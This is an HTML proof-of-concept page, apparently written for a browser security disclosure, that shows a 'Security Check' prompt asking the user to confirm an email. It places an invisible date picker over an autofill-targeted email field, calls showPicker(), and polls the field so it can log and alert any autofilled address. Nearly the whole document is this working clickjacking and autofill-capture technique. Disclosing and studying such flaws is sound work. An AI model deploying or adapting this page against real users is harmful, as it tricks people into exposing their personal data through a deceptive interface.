<!DOCTYPE html>
<html>
<head>
  <title>showPicker Autofill Capture PoC</title>
  <style>
    body {
      font-family: sans-serif;
      margin: 50px;
    }
    #spoof, #email {
      position: absolute;
      top: 100px;
      left: 50px;
      width: 300px;
      height: 40px;
      font-size: 16px;
    }
    #spoof {
      opacity: 0; /* Invisible */
      z-index: 10;
    }
    #email {
      z-index: 1;
    }
  </style>
</head>
<body>

<h2>Security Check</h2>
<p>Please confirm your email:</p>

<!-- Fake date picker on top -->
<input type="date" id="spoof" />
<!-- Autofill-targeted field -->
<input type="text" id="email" name="email" autocomplete="email" placeholder="Email">

<script>
const picker = document.getElementById('spoof');
const email = document.getElementById('email');

// Trigger picker UI when user clicks anywhere
picker.showPicker();

// Monitor autofill
setInterval(() => {
  if (email.value) {
    console.log("Captured Autofill Data:", email.value);
    alert("Your email was autofilled: " + email.value);
  }
}, 1000);
</script>

</body>
</html>
